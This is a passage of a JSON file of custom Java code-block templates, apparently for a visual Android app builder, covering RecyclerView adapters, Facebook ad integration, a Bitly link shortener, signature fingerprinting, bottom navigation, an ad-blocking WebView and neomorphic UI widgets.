%s.inputOnly"},{"code":"private ImageView %1$s;","name":"PrivateImageViewWidget","palette":"42","type":" ","spec":"PrivateImageView %s.inputOnly"},{"code":"        %1$s(View %2$s) {\n            super(%2$s);\n            %3$s\n        }","name":"ViewHolderItem","palette":"42","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly"},{"code":"        %1$s \u003d %2$s.findViewById(R.id.%1$s);","name":"findViewWidget","palette":"42","type":" ","spec":"findView %s.inputOnly atView %s.inputOnly"},{"code":"    @Override\n    public %1$s onCreateViewHolder(ViewGroup parent, int viewType) {\n        //Membuat View untuk Menyiapkan dan Memasang Layout yang Akan digunakan pada RecyclerView\n        View %2$s \u003d LayoutInflater.from(parent.getContext()).inflate(R.layout.%3$s, parent, false);\n        return new %1$s(%2$s);\n    }","name":"onCreateViewHolder","palette":"42","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly inflateLayout %s.inputOnly"},{"code":"    @Override\n    public void onBindViewHolder(%1$s %2$s, int position) {\n        %3$s\n    }","name":"onBindView","palette":"42","type":"c","spec":"onBindViewHolder ViewHolder %s.inputOnly nameViewHolder %s.inputOnly"},{"code":"position","name":"position","palette":"42","type":"d","spec":"position"},{"code":"%1$s.get%2$s()","name":"StringGetData","palette":"42","type":"s","spec":"ListName %s.inputOnly getKey %s.inputOnly"},{"code":"final String %1$s \u003d %2$s;","name":"finalString","palette":"42","type":" ","spec":"FinalStringName %s.inputOnly dataString %s"},{"code":"%1$s","name":"getString","typeName":"String","palette":"42","type":"v","spec":"StringName %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetText","typeName":"TextView","palette":"42","type":"v","spec":"holderName %s.inputOnly TextView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetImage","typeName":"ImageView","palette":"42","type":"v","spec":"holderName %s.inputOnly ImageView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderLinearLayout","typeName":"LinearLayout","palette":"42","type":"v","spec":"holderName %s.inputOnly LinearLayout_ID %s.inputOnly"},{"code":"        %1$s.setOnLongClickListener(new View.OnLongClickListener() {\n            @Override\n            public boolean onLongClick(View v) {\n                \n                %2$s\n                return true;\n            }\n        });","name":"onLongClickItem","palette":"42","type":"c","spec":"onLongClickItem %m.View"},{"code":"    @Override\n    public int getItemCount() {\n        //Menghitung Ukuran/Jumlah Data Yang Akan Ditampilkan Pada RecyclerView\n        %1$s\n    }","name":"getItemCountRecyclerview","palette":"42","type":"c","spec":"getItemCount Recyclerview"},{"code":"        return %1$s.size();","name":"MaxSizeListData","palette":"42","type":" ","spec":"MaxSizeList %s.inputOnly"},{"code":"        return %1$s;","name":"CountListData","palette":"42","type":" ","spec":"CountList %d"},{"code":"public class %1$s {\n\n    %2$s\n}","name":"ClassModel","palette":"42","type":"c","spec":"RecyclerView ClassModel %s.inputOnly"},{"code":"    private String %1$s;","name":"privateStringModel","palette":"42","type":" ","spec":"StringName %s.inputOnly"},{"code":"    public String get%1$s() {\n        return %2$s;\n    }\n\n    public void set%1$s(String %2$s) {\n        this.%2$s \u003d %2$s;\n    }","name":"publicVoidString","palette":"42","type":" ","spec":"public String %s.inputOnly return %s.inputOnly"},{"code":"    public %1$s(){\n    }\n\n    //Konstruktor dengan beberapa parameter, untuk mendapatkan Input Data dari User\n    public %1$s(%2$s) {\n        %3$s\n    }","name":"getDataFirebase","palette":"42","type":"c","spec":"ClassModelName %s.inputOnly allString %s.inputOnly"},{"code":"        this.%1$s \u003d %1$s;","name":"indexStringNameDateFB","palette":"42","type":" ","spec":"IndexStringName %s.inputOnly"},{"code":"private CardView %1$s;","name":"PrivateCardView","palette":"42","type":" ","spec":"PrivateCardView %s.inputOnly"},{"code":"%1$s.setAdapter(new %1$SAdapter(%2$s));","name":"RecyclerViewAdapter","palette":"42","type":" ","spec":"RecyclerView %m.RecyclerView data %m.list"},{"code":"%1$s \u003d new AdView(%3$s.this, %2$s, AdSize.BANNER_HEIGHT_50);","name":"FANBanner320_50","palette":"43","type":" ","spec":"Banner 320_50 %m.FBAdsBanner PlaceID %s at %m.activity"},{"code":"%1$s.loadAd();","name":"FANBannerLoad","palette":"43","type":" ","spec":"%m.FBAdsBanner LoadAds"},{"code":"%1$s.addView(%2$s);","name":"AdAdsToView","palette":"43","type":" ","spec":"View %m.view add %m.FBAdsBanner"},{"code":"%1$s \u003d new AdView(%3$s.this, %2$s, AdSize.RECTANGLE_HEIGHT_250);","name":"FANBanner300_250","palette":"43","type":" ","spec":"Banner 300_250 %m.FBAdsBanner PlaceID %s at %m.activity"},{"code":"%1$s \u003d new InterstitialAd(%2$s.this, %3$s);\r","name":"InterstitialAds","palette":"43","type":" ","spec":"%m.FBAdsInterstitial at %m.activity with PlacementID %s"},{"code":"%1$s.loadAd();\r","name":"InterstitialAdsLoad","palette":"43","type":" ","spec":"%m.FBAdsInterstitial LoadAds"},{"code":"%1$s.show();","name":"InterstitialAdsShow","palette":"43","type":" ","spec":"%m.FBAdsInterstitial Show"},{"code":"                // Set listeners for the Interstitial Ad\n\t\t        %1$s.setAdListener(new InterstitialAdListener() {\n\t\t\t            %2$s\n\t\t\t    });","name":"InterstitialAdsListener","palette":"43","type":"c","spec":"%m.FBAdsInterstitial setListener"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onInterstitialDisplayed(Ad ad) {\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t        }","name":"IntersOnAdsDisplay","palette":"43","type":"c","spec":"IntersOnAdsDisplay"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onInterstitialDismissed(Ad ad) {\n\t\t\t\t                // Interstitial dismissed callback\n\t\t\t\t                \n\t\t\t\t                %1$s\n\t\t\t\t        }","name":"IntersOnAdsDismiss","palette":"43","type":"c","spec":"IntersOnAdsDismiss"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onError(Ad ad, AdError adError) {\n\t\t\t\t                // Ad error callback\n\t\t\t\t                \n\t\t\t\t           \r\n\t\t\t\t                final String StringErrorLoadFBAd \u003d adError.getErrorMessage();\r\n\t\t\t\t                %1$s\r\n\t\t\t\t        }","name":"IntersOnAdsError","palette":"43","type":"c","spec":"IntersOnAdsError"},{"code":"StringErrorLoadFBAd","name":"StringErrorLoadFBAd","typeName":"String","palette":"43","type":"v","spec":"StringErrorLoadFBAd"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdLoaded(Ad ad) {\n\t\t\t\t                // Interstitial ad is loaded and ready to be displayed\n\t\t\t\t                \n\t\t\t\t\n\t\t\t\t            \r\n\t\t\t\t                %1$s\r\n\t\t\t            }","name":"IntersOnAdsLoaded","palette":"43","type":"c","spec":"IntersOnAdsLoaded"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdClicked(Ad ad) {\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onLoggingImpression(Ad ad) {\n\t\t\t\t                // Ad impression logged callback\n\t\t\t\t                \n\t\t\t\t            }","name":"IntersOnAdsClicks","palette":"43","type":"c","spec":"IntersOnAdsClicks"},{"code":"AudienceNetworkAds.initialize(this);","name":"AudienceNetworkAds_init","palette":"43","type":" ","spec":"AudienceNetworkAds Initialize"},{"code":"AdSettings.setIntegrationErrorMode(INTEGRATION_ERROR_CRASH_DEBUG_MODE);","name":"FBAdsSettings","palette":"43","type":" ","spec":"FBAdsSettings"},{"code":"// Instantiate a NativeAd object.\n        // NOTE: the placement ID will eventually identify this as your App, you can ignore it for\n        // now, while you are testing and replace it later when you have signed up.\n        // While you are using this temporary code you will only get test ads and if you release\n        // your code like this to the Google Play your users will not receive ads (you will get a no fill error).\n        %1$s \u003d new NativeAd(%2$s.this, %3$s);","name":"FBNativeLoad","palette":"43","type":" ","spec":"%m.NativeAd Load at %m.activity withPlacementID %s"},{"code":"\n\t\t        %1$s.setAdListener(new NativeAdListener() {\n\t\t\t            %2$s\n\t\t\t        });","name":"NativeAdsetListener","palette":"43","type":"c","spec":"%m.NativeAd setListener"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onMediaDownloaded(Ad ad) {\n\t\t\t\t                // Native ad finished downloading all assets\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onError(Ad ad, AdError adError) {\n\t\t\t\t                // Native ad failed to load\n\t\t\t\t                final String ErrorNativeLoad \u003d adError.getErrorMessage();\n\t\t\t\t                %1$s\n\t\t\t\t            }","name":"OnErrorLoadNative","palette":"43","type":"c","spec":"OnErrorLoadNative"},{"code":"ErrorNativeLoad","name":"ErrorNativeLoad","typeName":"String","palette":"43","type":"v","spec":"ErrorNativeLoad"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onAdLoaded(Ad ad) {\n\t\t\t\t                // Native ad is loaded and ready to be displayed\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdClicked(Ad ad) {\n\t\t\t\t                // Native ad clicked\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onLoggingImpression(Ad ad) {\n\t\t\t\t                // Native ad impression\n\t\t\t\t                \n\t\t\t\t            }","name":"OnLoadedNativeAds","palette":"43","type":"c","spec":"OnLoadedNativeAds"},{"code":"                                // Race condition, load() called again before last ad was displayed\n\t\t\t\t                if (%1$s \u003d\u003d null || %1$s !\u003d ad) {\n\t\t\t\t\t                    return;\n\t\t\t\t\t                }\n\t\t\t\t                // Inflate Native Ad into Container\n\t\t\t\t                inflateAd(%1$s);\n\n","name":"InflateNativeToContainer","palette":"43","type":" ","spec":"if %m.NativeAd notNull then InflateNativeAd"},{"code":"%1$s \u003d new NativeAdLayout(%2$s.this);\n%1$s.setLayoutParams(new android.view.ViewGroup.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT,\nandroid.view.ViewGroup.LayoutParams.WRAP_CONTENT));\n%3$s.addView(%1$s);","name":"CreateNativeAdLayout","palette":"43","type":" ","spec":"Create %m.NativeAdLayout at %m.activity inflateTo %m.view"},{"code":"\n\t}\n\tprivate void inflateAd(NativeAd %1$s) {\n\t\t\n\t\t        %1$s.unregisterView();\n\t\t        LayoutInflater inflater \u003d LayoutInflater.from(%3$s.this);\n\t\t        // Inflate the Ad view.  The layout referenced should be the one you created in the last step.\n\t\t        LinearLayout adViewNative \u003d (LinearLayout) inflater.inflate(R.layout.native_ad_layout, nativeAdLayout, false);\n\t\t        %2$s.addView(adViewNative);\n\t\t\n\t\t        // Add the AdOptionsView\n\t\t        LinearLayout adChoicesContainer \u003d findViewById(R.id.ad_choices_container);\n\t\t        AdOptionsView adOptionsView \u003d new AdOptionsView(%3$s.this, %1$s, %2$s);\n\t\t        adChoicesContainer.removeAllViews();\n\t\t        adChoicesContainer.addView(adOptionsView, 0);\n\t\t\n\t\t        // Create native UI using the ad metadata.\n\t\t        AdIconView nativeAdIcon \u003d adViewNative.findViewById(R.id.native_ad_icon);\n\t\t        TextView nativeAdTitle \u003d adViewNative.findViewById(R.id.native_ad_title);\n\t\t        MediaView nativeAdMedia \u003d adViewNative.findViewById(R.id.native_ad_media);\n\t\t        TextView nativeAdSocialContext \u003d adViewNative.findViewById(R.id.native_ad_social_context);\n\t\t        TextView nativeAdBody \u003d adViewNative.findViewById(R.id.native_ad_body);\n\t\t        TextView sponsoredLabel \u003d adViewNative.findViewById(R.id.native_ad_sponsored_label);\n\t\t        Button nativeAdCallToAction \u003d adViewNative.findViewById(R.id.native_ad_call_to_action);\n\t\t\n\t\t        // Set the Text.\n\t\t        nativeAdTitle.setText(%1$s.getAdvertiserName());\n\t\t        nativeAdBody.setText(%1$s.getAdBodyText());\n\t\t        nativeAdSocialContext.setText(%1$s.getAdSocialContext());\n\t\t        nativeAdCallToAction.setVisibility(%1$s.hasCallToAction() ? View.VISIBLE : View.INVISIBLE);\n\t\t        nativeAdCallToAction.setText(%1$s.getAdCallToAction());\n\t\t        sponsoredLabel.setText(%1$s.getSponsoredTranslation());\n\t\t\n\t\t        // Create a list of clickable views\n\t\t        List\u003cView\u003e clickableViews \u003d new ArrayList\u003c\u003e();\n\t\t        clickableViews.add(nativeAdTitle);\n\t\t        clickableViews.add(nativeAdCallToAction);\n\t\t\n\t\t        // Register the Title and CTA button to listen for clicks.\n\t\t        %1$s.registerViewForInteraction(\n\t\t                adViewNative,\n\t\t                nativeAdMedia,\n\t\t                nativeAdIcon,\n\t\t                clickableViews);\n\t\t\n\t\t    }\n\t{","name":"ClassInflateNativeAd","palette":"43","type":" ","spec":"Class Inflate %m.NativeAd to %m.NativeAdLayout at %m.activity"},{"code":"%1$s.loadAd();","name":"NativeAdsLoad","palette":"43","type":" ","spec":"%m.NativeAd LoadAds"},{"code":"}\npublic class BitlyShortUrl extends AsyncTask\u003cVoid, Void, Void\u003e {\n    private static final String TAG \u003d \"UrlShortner\";\n    private String Response \u003d \"\";\n    private Context context;\n    private boolean isValid \u003d false;\n    private String longUrl \u003d \"\";\n    private String shortUrl \u003d \"\";\n\n    BitlyShortUrl(String url, Context ctx) {\n        this.longUrl \u003d url;\n        this.context \u003d ctx;\n    }\n\n    protected Void doInBackground(Void... voids) {\n        try {\n            java.net.HttpURLConnection httpURLConnection \u003d (java.net.HttpURLConnection) new java.net.URL(\"https://api-ssl.bitly.com/v3/shorten?access_token\u003d\" + %1$s + \"\u0026longUrl\u003d\" + java.net.URLEncoder.encode(this.longUrl, \"utf-8\")).openConnection();\n            Log.d(TAG, \"https://api-ssl.bitly.com/v3/shorten?access_token\u003d\" + %1$s + \"\u0026longUrl\u003d\" + java.net.URLEncoder.encode(this.longUrl, \"utf-8\"));\n            httpURLConnection.connect();\n            java.io.BufferedReader mBufferedInputStream \u003d new java.io.BufferedReader(new java.io.InputStreamReader(httpURLConnection.getInputStream()));\n            while (true) {\n                String inline \u003d mBufferedInputStream.readLine();\n                if (inline \u003d\u003d null) {\n                    break;\n                }\n                this.Response +\u003d inline;\n            }\n            mBufferedInputStream.close();\n            Log.d(\"response\", this.Response);\n            parseResponse(this.Response);\n        } catch (java.net.MalformedURLException e) {\n            e.printStackTrace();\n        } catch (java.io.UnsupportedEncodingException e2) {\n            e2.printStackTrace();\n        } catch (java.net.ProtocolException e3) {\n            e3.printStackTrace();\n        } catch (java.io.IOException e4) {\n            e4.printStackTrace();\n        }\n        return null;\n    }\n\n    private void parseResponse(String Response) {\n        Log.d(TAG, \"parseResponse: \" + Response);\n        try {\n            org.json.JSONObject jsonObject \u003d new org.json.JSONObject(Response);\n            if (jsonObject.getInt(\"status_code\") \u003d\u003d androidx.recyclerview.widget.ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION) {\n                this.shortUrl \u003d jsonObject.getJSONObject(\"data\").getString(\"url\");\n                this.isValid \u003d true;\n                return;\n            }\n            this.isValid \u003d false;\n        } catch (org.json.JSONException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected void onPostExecute(Void aVoid) {\n        super.onPostExecute(aVoid);\n        if (this.isValid) {\n            %2$s\n        } else {\n            %3$s\n        }\n    }\n}\n{","name":"CreateClassBitlyShortener","palette":"44","type":"e","spec":"Bit.Ly Class AccessToken %s TaskInBackground If Success"},{"code":"new BitlyShortUrl(%1$s, %2$s.this).execute(new Void[0]);","name":"CreateShortLinkTask","palette":"44","type":" ","spec":"Start Short Link %s at %m.activity runTaskInBackground"},{"code":"shortUrl","name":"shortUrl","typeName":"String","palette":"44","type":"v","spec":"shortUrl"},{"code":"Context %1$s \u003d this.getApplicationContext();","name":"Context","palette":"45","type":" ","spec":"Context %s.inputOnly init"},{"code":"%1$s \u003d getApplicationContext().getPackageName();","name":"PackageName","palette":"45","type":" ","spec":"getPackageNameApp toString %m.String"},{"code":"try {\n  final android.content.pm.PackageInfo info \u003d context.getPackageManager()\n          .getPackageInfo(%1$s, android.content.pm.PackageManager.GET_SIGNATURES);\n\n  for (android.content.pm.Signature signature : info.signatures) {\n     final java.security.MessageDigest md \u003d java.security.MessageDigest.getInstance(%2$S);\n      md.update(signature.toByteArray());\n\n      final byte[] digest \u003d md.digest();\n      final StringBuilder toRet \u003d new StringBuilder();\n      for (int i \u003d 0; i \u003c digest.length; i++) {\n          if (i !\u003d 0) toRet.append(\":\");\n          int b \u003d digest[i] \u0026 0xff;\n          String hex \u003d Integer.toHexString(b);\n          if (hex.length() \u003d\u003d 1) toRet.append(\"0\");\n          toRet.append(hex);\n      }          \n      String MD5app \u003d toRet.toString();\n      %3$s\n  }\n} catch (android.content.pm.PackageManager.NameNotFoundException e1) {\n      Log.e(\"name not found\", e1.toString());\n} catch (java.security.NoSuchAlgorithmException e) {\n      Log.e(\"no such an algorithm\", e.toString());\n} catch (Exception e) {\n      Log.e(\"exception\", e.toString());\n}\n            ","name":"getMD5Cert","palette":"45","type":"c","spec":"getMD5Cert AppID %s withKey %s"},{"code":"MD5app","name":"MD5app","typeName":"String","palette":"45","type":"v","spec":"MD5app"},{"code":"Menu %1$s \u003d %2$s.getMenu();","name":"MenuGetBottomNavigation","palette":"46","type":" ","spec":"Menu %s.inputOnly get %m.BottomNavigationView"},{"code":"final int %1$S \u003d %2$s;","name":"intMenu","palette":"46","type":" ","spec":"intName %s.inputOnly intPosition %d"},{"code":"%1$s.add(Menu.NONE, %2$S, Menu.NONE, %3$s).setIcon(R.drawable.%4$s);","name":"AddMenu","palette":"46","type":" ","spec":"Menu %s.inputOnly add intName %s.inputOnly TitleMenu %s Icon %m.resource"},{"code":"%1$s.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic boolean onNavigationItemSelected(MenuItem item) {\r\n\t\t\t\t%2$s\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t});","name":"ListenerBottomNav","palette":"46","type":"c","spec":"BottomNavigationView %m.BottomNavigationView onClickMenu"},{"code":"\n\t\t\t\tswitch (item.getItemId()) {\r\n\t\t\t\t\t%1$s\r\n\t\t\t\t}\r","name":"SwitchGetItemID","palette":"46","type":"c","spec":"SwitchGetItemID"},{"code":"                 case %1$S :\n                    %2$s\n\t\t\t\t\tbreak;","name":"CaseItemID","palette":"46","type":"c","spec":"CaseItemID %s.inputOnly"},{"code":"%1$s.setSelectedItemId(%2$s);","name":"BottomNavViewSetSelected","palette":"46","type":" ","spec":"%m.BottomNavigationView setSelected %d"},{"code":"new AdBlockerWebView.init(%1$s.this).initializeWebView(%2$s);","name":"AdBlockWebview.init","palette":"47","type":" ","spec":"AdBlockerWebView at %m.activity for %m.webview"},{"code":"%1$s.setWebViewClient(new %1$S_Client());","name":"WebViewSetClientAdBlock","palette":"47","type":" ","spec":"%m.webview setClientAdBlocker"},{"code":"}\nprivate class %1$S_Client extends WebViewClient {\n\n        %1$S_Client() {}\n\n        @SuppressWarnings(\"deprecation\")\n        @Override\n        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {\n\n            return AdBlockerWebView.blockAds(view,url) ? com.monstertechno.adblocker.util.AdBlocker.createEmptyResource() :\n                    super.shouldInterceptRequest(view, url);\n\n        }\n\n        @Override\n        public void onPageStarted(WebView view, String url, Bitmap favicon) {\n            super.onPageStarted(view, url, favicon);\n        }\n\n        @Override\n        public void onPageFinished(WebView view, String url) {\n            %2$s\n            super.onPageFinished(view, url);\n        }\n\n    }\n\n{","name":"ClassAdBlockerClient","palette":"47","type":"c","spec":"Class AdBlockerClient for %m.webview onPageFinished"},{"code":"androidx.core.widget.NestedScrollView %1$s \u003d new androidx.core.widget.NestedScrollView(%4$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));\n%2$s.addView(%1$s);\n%1$s.addView(%3$s);","name":"NestedScrollView","palette":"48","type":" ","spec":"NestedScrollView_id -\u003e %s.inputOnly addToView %m.view andView %m.view addToNested at %m.activity"},{"code":"((ViewGroup)%1$s.getParent()).removeView(%1$s);","name":"RemoveViewGroup","palette":"48","type":" ","spec":"RemoveViewGroup For %m.view"},{"code":"androidx.core.view.ViewCompat.setNestedScrollingEnabled(%1$s, %2$s);","name":"SetNestedScrolling","palette":"48","type":" ","spec":"SetNestedScrollingTo %m.MyListView Enable %b"},{"code":"%1$s \u003d new MyListView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));","name":"CreateListViewOnNested","palette":"48","type":" ","spec":"MyListView %m.MyListView at %m.activity"},{"code":"%1$s.setAdapter(new %1$SAdapter(%2$s));\n%1$s.setDividerHeight(%3$s);\n%4$s.addView(%1$s);","name":"MyListViewAdapter","palette":"48","type":" ","spec":"%m.MyListView setAdapter %m.listMap setDividerHeight %d addListViewTo %m.view"},{"code":"%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\n     @Override\n     public void onItemClick(AdapterView\u003c?\u003e a, View b, int c, long d) {\n        %2$s\n     }\n});","name":"MyListViewOnClickListener","palette":"48","type":"c","spec":"%m.MyListView onClickListener"},{"code":"}\npublic class MyListView extends ListView {\n    public MyListView(Context a) {\n    super(a);\n    }\n\n    @Override\n    public void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        int heightMeasureSpec_custom \u003d MeasureSpec.makeMeasureSpec( Integer.MAX_VALUE \u003e\u003e 1, MeasureSpec.AT_MOST);\n        super.onMeasure(widthMeasureSpec, heightMeasureSpec_custom);\n        ViewGroup.LayoutParams params \u003d getLayoutParams();\n        params.height \u003d getMeasuredHeight();\n    }\n}\n\npublic class %1$SAdapter extends BaseAdapter {\n\t\tArrayList\u003cHashMap\u003cString, Object\u003e\u003e _data;\n\t\tpublic %1$SAdapter(ArrayList\u003cHashMap\u003cString, Object\u003e\u003e _arr) {\n\t\t\t_data \u003d _arr;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic int getCount() {\n\t\t\treturn _data.size();\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic HashMap\u003cString, Object\u003e getItem(int _index) {\n\t\t\treturn _data.get(_index);\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic long getItemId(int _index) {\n\t\t\treturn _index;\n\t\t}\n\t\t@Override\n\t\tpublic View getView(final int position, View _view, ViewGroup _viewGroup) {\n\t\t\tLayoutInflater _inflater \u003d (LayoutInflater)getBaseContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n\t\t\tView _v \u003d _view;\n\t\t\tif (_v \u003d\u003d null) {\n\t\t\t\t_v \u003d _inflater.inflate(R.layout.%2$s, null);\n\t\t\t}\n\t\t\t\n\t\t\t%3$s\n\t\t\t\n\t\t\t\n\t\t\treturn _v;\n\t\t}\n\t}\n\t\nprivate void doNothingBrooo(){","name":"MyListViewOnBindViewClass","palette":"48","type":"c","spec":"%m.MyListView onBindView CustomLayout %s.inputOnly"},{"code":"\n\t\t\tfinal %1$s %2$s \u003d (%1$s) _v.findViewById(R.id.%2$s);","name":"ID_WidgetOnBindView","palette":"48","type":" ","spec":"WidgetType %s.inputOnly id %s.inputOnly"},{"code":"%1$s","name":"MyListView","typeName":"ListView","palette":"48","type":"v","spec":"%m.MyListView"},{"code":"androidx.core.view.ViewCompat.setNestedScrollingEnabled(%1$s, %2$s);","name":"SetNestedScrollingView","palette":"48","type":" ","spec":"SetNestedScrollingTo %m.view Enable %b"},{"code":"%1$s \u003d new PolygonView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%1$s.setStyle(%3$s);\n%1$s.setSide(%4$s);\n%5$s.addView(%1$s);","name":"PolygonView","palette":"49","type":" ","spec":"Create %m.PolygonView at %m.activity Style %d Side %d inflateTo %m.view"},{"code":"%1$s \u003d new PolygonButton(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%1$s.setSide(%3$s);\n%4$s.addView(%1$s);","name":"PolygonButtonAtPolygonView","palette":"49","type":" ","spec":"Create %m.PolygonButton at %m.activity Side %d inflateTo %m.PolygonView"},{"code":"%1$s \u003d new PolygonButton(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%1$s.setSide(%3$s);\n%4$s.addView(%1$s);","name":"PolygonButtonAtView","palette":"49","type":" ","spec":"Create %m.PolygonButton at %m.activity Side %d inflateTo %m.view"},{"code":"%1$s","name":"ViewPolygonView","typeName":"View","palette":"49","type":"v","spec":"%m.PolygonView"},{"code":"%1$s","name":"ViewPolygonButton","typeName":"View","palette":"49","type":"v","spec":"%m.PolygonButton"},{"code":"%1$s.setBorderWidth((float)%2$s);","name":"PVsetBorderWidth","palette":"49","type":" ","spec":"%m.view setBorderWidth %d"},{"code":"%1$s.setBorderColor(%2$s);","name":"PVsetBorderColor","palette":"49","type":" ","spec":"%m.view setBorderColor %m.color"},{"code":"%1$s.setBorderColor(Color.parseColor(%2$s));","name":"PVsetBorderParseColor","palette":"49","type":" ","spec":"%m.view setBorderColor %s"},{"code":"%1$s.setBackground_color(%2$s);\n%1$s.setDark_color(%3$s);\n%1$s.setLight_color(%4$s);","name":"ModeColor_int","palette":"49","type":" ","spec":"Neomorphic %m.view BGcolor %m.color DarkColor %m.color LightColor %m.color"},{"code":"ImageView %1$s \u003d new ImageView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\r\n%1$s.setImageResource(R.drawable.%3$s);\n%1$s.setColorFilter(%4$s, PorterDuff.Mode.MULTIPLY);\nint %1$SpaddingDp \u003d (int)%5$s;\nfloat %1$Sdensity \u003d getApplicationContext().getResources().getDisplayMetrics().density;\nint %1$SpaddingPixel \u003d (int)(%1$SpaddingDp * %1$Sdensity);\n%1$s.setPadding(%1$SpaddingPixel, %1$SpaddingPixel , %1$SpaddingPixel , %1$SpaddingPixel);\r\n%6$s.addView(%1$s);","name":"SetIcon","palette":"49","type":" ","spec":"IconID %s.inputOnly at %m.activity Image %m.resource Color %m.color Padding %d addTo %m.view"},{"code":"ImageView %1$s \u003d new ImageView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\r\n%1$s.setImageResource(R.drawable.%3$s);\n%1$s.setColorFilter(Color.parseColor(%4$s), PorterDuff.Mode.MULTIPLY);\nint %1$SpaddingDp \u003d (int)%5$s;\nfloat %1$Sdensity \u003d getApplicationContext().getResources().getDisplayMetrics().density;\nint %1$SpaddingPixel \u003d (int)(%1$SpaddingDp * %1$Sdensity);\n%1$s.setPadding(%1$SpaddingPixel, %1$SpaddingPixel , %1$SpaddingPixel , %1$SpaddingPixel);\r\n%6$s.addView(%1$s);","name":"SetIconColorParse","palette":"49","type":" ","spec":"IconID %s.inputOnly at %m.activity Image %m.resource Color %s Padding %d addTo %m.view"},{"code":"%1$s.setStyle(%2$s);","name":"SetStyle","palette":"49","type":" ","spec":"Neomorphic %m.view setStyle %d"},{"code":"%1$s \u003d new CircleView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%1$s.setBackgroundColor(%3$s);\n%4$s.addView(%1$s);","name":"CircleViewButton","palette":"49","type":" ","spec":"Create %m.CircleView at %m.activity BGcolor %m.color inflateTo %m.view"},{"code":"        ViewGroup viewGroup \u003d %1$s;\n        final ImageView %2$S \u003d (ImageView) viewGroup.getChildAt(0);\n        %1$s.setOnTouchListener(new View.OnTouchListener() {\n            @Override\n            public boolean onTouch(View v, MotionEvent event) {\n                // is shape Contains Point ----\u003e for detect place of Touch is in the shape or not\n                if (%1$s.isShapeContainsPoint(event.getX(), event.getY())) {\n                    switch (event.getAction()) {\n                        case MotionEvent.ACTION_DOWN:\n                            // PRESSED\n                            //use only \"small inner shadow\" because its same size with \"drop shadow\" style and \"big inner shadow\" is bigger\n                            // \"small inner shadow\" \u003d \"drop shadow\"\n                            // \"big inner shadow\"  \u003e \"drop shadow\"\n                            %1$s.setStyle(neo.small_inner_shadow);\n                            %2$S.setScaleX(%2$S.getScaleX() * 0.9f);\n                            %2$S.setScaleY(%2$S.getScaleY() * 0.9f);\n                            %3$s\n                            return true; // if you want to handle the touch event\n                        case MotionEvent.ACTION_UP:\n                        case MotionEvent.ACTION_CANCEL:\n                            // RELEASED\n                            %1$s.setStyle(neo.drop_shadow);\n                            %2$S.setScaleX(1);\n                            %2$S.setScaleY(1);\n                            return true; // if you want to handle the touch event\n                    }\n                }\n                return false;\n            }\n        });","name":"CircleViewOnTouch","palette":"49","type":"c","spec":"%m.CircleView with Icon ID %s.inputOnly onTouchListener"},{"code":"%1$s","name":"ViewCircleView","typeName":"View","palette":"49","type":"v","spec":"%m.CircleView"},{"code":"%1$s \u003d new neoText(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT,LinearLayout.LayoutParams.WRAP_CONTENT));\n%1$s.setStyle(%3$s);\n%4$s.addView(%1$s);","name":"NeoTextView","palette":"49","type":" ","spec":"NeoText %m.neoText at %m.activity Style %d inflateTo %m.view"},{"code":"TextView %1$s \u003d new TextView(%2$s.this);\n%1$s.setLayoutParams(new 